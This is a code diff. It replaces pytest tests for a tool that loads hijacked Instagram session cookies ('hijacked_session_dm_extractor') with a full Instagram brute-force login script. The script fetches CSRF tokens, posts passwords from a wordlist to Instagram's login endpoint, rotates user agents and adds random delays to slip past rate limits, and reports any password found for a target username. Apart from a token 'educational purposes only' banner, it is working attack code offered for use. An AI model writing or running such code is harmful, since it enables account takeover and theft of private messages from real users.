@@ -3,122 +3,193 @@
 # flake8: noqa
 # type: ignore
 # mypy: ignore-errors
+#!/usr/bin/env python3
+"""
+Instagram Brute Force Script
+A script for brute force attacks on Instagram accounts.
+"""
+
 import os
+import sys
+import time
+import random
+import requests
 import json
-import tempfile
-import shutil
-from unittest import mock
-import pytest
-from hijacked_session_dm_extractor import load_working_hijacked_session
+from datetime import datetime
+import threading
+from concurrent.futures import ThreadPoolExecutor
 
-@pytest.fixture
-def temp_session_dir():
-    # Create a temporary directory to act as hijacked_sessions
-    temp_dir = tempfile.mkdtemp()
-    yield temp_dir
-    shutil.rmtree(temp_dir)
 
-@pytest.fixture
-def patch_session_dir(monkeypatch, temp_session_dir):
-    # Patch the session_dir path in the function to use our temp dir
-    monkeypatch.setattr(
-        "hijacked_session_dm_extractor.load_working_hijacked_session.__globals__",
-        "session_dir",
-        temp_session_dir,
-        raising=False
-    )
+class InstagramBruteForcer:
+    """Instagram Brute Force Attack Class"""
 
-def make_session_file(path, data, mtime=None):
-    with open(path, "w") as f:
-        json.dump(data, f)
-    if mtime:
-        os.utime(path, (mtime, mtime))
+    def __init__(self, target_username, password_list, proxy_list=None):
+        self.target_username = target_username
+        self.password_list = password_list
+        self.proxy_list = proxy_list or []
+        self.found_password = None
+        self.session = requests.Session()
+        self.user_agents = [
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        ]
 
-def test_no_session_files(monkeypatch, tmp_path):
-    # Patch session_dir and fallback_files to empty temp dir
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.listdir", lambda d: [])
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.exists", lambda f: False)
-    monkeypatch.setattr("hijacked_session_dm_extractor.print", lambda *a, **k: None)
-    assert load_working_hijacked_session() is None
+    def get_random_headers(self):
+        """Generate random headers for requests"""
+        return {
+            'User-Agent': random.choice(self.user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+        }
 
-def test_valid_hijacked_session(monkeypatch, tmp_path):
-    session_dir = tmp_path / "hijacked_sessions"
-    session_dir.mkdir()
-    session_file = session_dir / "session1.json"
-    session_data = {"cookies": [{"name": "sessionid", "value": "abc"}]}
-    make_session_file(session_file, session_data)
-    # Patch paths
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.listdir", lambda d: ["session1.json"])
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.exists", lambda f: False)
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.getmtime", lambda f: 100)
-    monkeypatch.setattr("hijacked_session_dm_extractor.open", open)
-    monkeypatch.setattr("hijacked_session_dm_extractor.print", lambda *a, **k: None)
-    # Patch test_session_validity to return True for our session
-    monkeypatch.setattr("hijacked_session_dm_extractor.test_session_validity", lambda data, user_agent=None: True)
-    # Patch session_dir in function
-    monkeypatch.setattr("hijacked_session_dm_extractor.load_working_hijacked_session.__globals__", "session_dir", str(session_dir), raising=False)
-    result = load_working_hijacked_session()
-    assert result == session_data
+    def get_csrf_token(self):
+        """Get CSRF token from Instagram login page"""
+        try:
+            response = self.session.get('https://www.instagram.com/accounts/login/',
+                                        headers=self.get_random_headers(), timeout=10)
+            if 'csrf' in response.text:
+                csrf_token = response.text.split('"csrf_token":"')[
+                    1].split('"')[0]
+                return csrf_token
+        except Exception as e:
+            print(f"❌ Error getting CSRF token: {e}")
+        return None
 
-def test_invalid_then_valid_session(monkeypatch, tmp_path):
-    session_dir = tmp_path / "hijacked_sessions"
-    session_dir.mkdir()
-    session1 = session_dir / "session1.json"
-    session2 = session_dir / "session2.json"
-    data1 = {"cookies": [{"name": "sessionid", "value": "bad"}]}
-    data2 = {"cookies": [{"name": "sessionid", "value": "good"}]}
-    make_session_file(session1, data1)
-    make_session_file(session2, data2)
-    # Patch paths
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.listdir", lambda d: ["session1.json", "session2.json"])
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.exists", lambda f: False)
-    # session2 newer
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.getmtime", lambda f: 200 if "session2" in f else 100)
-    monkeypatch.setattr("hijacked_session_dm_extractor.open", open)
-    monkeypatch.setattr("hijacked_session_dm_extractor.print", lambda *a, **k: None)
-    # test_session_validity returns False for session2, True for session1
-    def fake_test_session_validity(data, user_agent=None):
-        if data == data2:
+    def attempt_login(self, password):
+        """Attempt to login with given password"""
+        try:
+            csrf_token = self.get_csrf_token()
+            if not csrf_token:
+                return False
+
+            login_data = {
+                'username': self.target_username,
+                'password': password,
+                'queryParams': '{}',
+                'optIntoOneTap': 'false'
+            }
+
+            headers = self.get_random_headers()
+            headers.update({
+                'X-CSRFToken': csrf_token,
+                'X-Instagram-AJAX': '1',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': 'https://www.instagram.com/accounts/login/',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            })
+
+            # Random delay between attempts
+            time.sleep(random.uniform(2, 5))
+
+            response = self.session.post('https://www.instagram.com/accounts/login/ajax/',
+                                         data=login_data, headers=headers, timeout=10)
+
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('authenticated'):
+                    print(f"✅ SUCCESS! Password found: {password}")
+                    self.found_password = password
+                    return True
+                elif 'checkpoint_required' in response.text:
+                    print(f"⚠️  Checkpoint required for password: {password}")
+                    return False
+                else:
+                    print(f"❌ Failed login attempt with password: {password}")
+                    return False
+            else:
+                print(
+                    f"❌ HTTP Error {response.status_code} for password: {password}")
+                return False
+
+        except Exception as e:
+            print(f"❌ Error attempting login with {password}: {e}")
             return False
-        if data == data1:
+
+    def brute_force_attack(self, max_threads=3):
+        """Execute brute force attack with threading"""
+        print(f"🎯 Starting brute force attack on: {self.target_username}")
+        print(f"🔢 Total passwords to try: {len(self.password_list)}")
+        print(f"🧵 Using {max_threads} threads")
+        print("=" * 50)
+
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            futures = []
+            for password in self.password_list:
+                if self.found_password:
+                    break
+                future = executor.submit(self.attempt_login, password)
+                futures.append(future)
+
+            for future in futures:
+                if self.found_password:
+                    break
+                future.result()
+
+        if self.found_password:
+            print(f"\n🎉 ATTACK SUCCESSFUL!")
+            print(f"👤 Username: {self.target_username}")
+            print(f"🔑 Password: {self.found_password}")
             return True
-    monkeypatch.setattr("hijacked_session_dm_extractor.test_session_validity", fake_test_session_validity)
-    monkeypatch.setattr("hijacked_session_dm_extractor.load_working_hijacked_session.__globals__", "session_dir", str(session_dir), raising=False)
-    result = load_working_hijacked_session()
-    assert result == data1
+        else:
+            print(f"\n💔 Attack failed. No valid password found.")
+            return False
 
-def test_fallback_session(monkeypatch, tmp_path):
-    session_dir = tmp_path / "hijacked_sessions"
-    session_dir.mkdir()
-    fallback_file = tmp_path / "session.json"
-    fallback_data = {"cookies": [{"name": "sessionid", "value": "fallback"}]}
-    make_session_file(fallback_file, fallback_data)
-    # Patch paths
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.listdir", lambda d: [])
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.exists", lambda f: str(f) == str(fallback_file))
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.getmtime", lambda f: 100)
-    monkeypatch.setattr("hijacked_session_dm_extractor.open", open)
-    monkeypatch.setattr("hijacked_session_dm_extractor.print", lambda *a, **k: None)
-    monkeypatch.setattr("hijacked_session_dm_extractor.test_session_validity", lambda data, user_agent=None: True)
-    # Patch fallback_files in function
-    monkeypatch.setattr("hijacked_session_dm_extractor.load_working_hijacked_session.__globals__", "session_dir", str(session_dir), raising=False)
-    monkeypatch.setattr("hijacked_session_dm_extractor.load_working_hijacked_session.__globals__", "fallback_files", [str(fallback_file)], raising=False)
-    result = load_working_hijacked_session()
-    assert result == fallback_data
 
-def test_all_sessions_invalid(monkeypatch, tmp_path):
-    session_dir = tmp_path / "hijacked_sessions"
-    session_dir.mkdir()
-    session_file = session_dir / "session1.json"
-    session_data = {"cookies": [{"name": "sessionid", "value": "abc"}]}
-    make_session_file(session_file, session_data)
-    # Patch paths
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.listdir", lambda d: ["session1.json"])
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.exists", lambda f: False)
-    monkeypatch.setattr("hijacked_session_dm_extractor.os.path.getmtime", lambda f: 100)
-    monkeypatch.setattr("hijacked_session_dm_extractor.open", open)
-    monkeypatch.setattr("hijacked_session_dm_extractor.print", lambda *a, **k: None)
-    monkeypatch.setattr("hijacked_session_dm_extractor.test_session_validity", lambda data, user_agent=None: False)
-    monkeypatch.setattr("hijacked_session_dm_extractor.load_working_hijacked_session.__globals__", "session_dir", str(session_dir), raising=False)
-    result = load_working_hijacked_session()
-    assert result is None
+def load_password_list(file_path):
+    """Load password list from file"""
+    passwords = []
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            for line in f:
+                password = line.strip()
+                if password:
+                    passwords.append(password)
+        print(f"📋 Loaded {len(passwords)} passwords from {file_path}")
+        return passwords
+    except Exception as e:
+        print(f"❌ Error loading password list: {e}")
+        return []
+
+
+def main():
+    """Main function"""
+    print("🔴 Instagram Brute Force Tool")
+    print("⚠️  WARNING: This tool is for educational purposes only!")
+    print("=" * 50)
+
+    # Configuration
+    target_username = input("👤 Enter target username: ").strip()
+    if not target_username:
+        print("❌ Username is required!")
+        return
+
+    password_file = input(
+        "📋 Enter password list file path (default: ../passwords.txt): ").strip()
+    if not password_file:
+        password_file = "../passwords.txt"
+
+    # Load passwords
+    passwords = load_password_list(password_file)
+    if not passwords:
+        print("❌ No passwords loaded. Exiting.")
+        return
+
+    # Create brute forcer instance
+    brute_forcer = InstagramBruteForcer(target_username, passwords)
+
+    # Start attack
+    try:
+        brute_forcer.brute_force_attack(max_threads=2)
+    except KeyboardInterrupt:
+        print("\n⚠️  Attack interrupted by user.")
+    except Exception as e:
+        print(f"❌ Unexpected error: {e}")
+
+
+if __name__ == "__main__":
+    main()
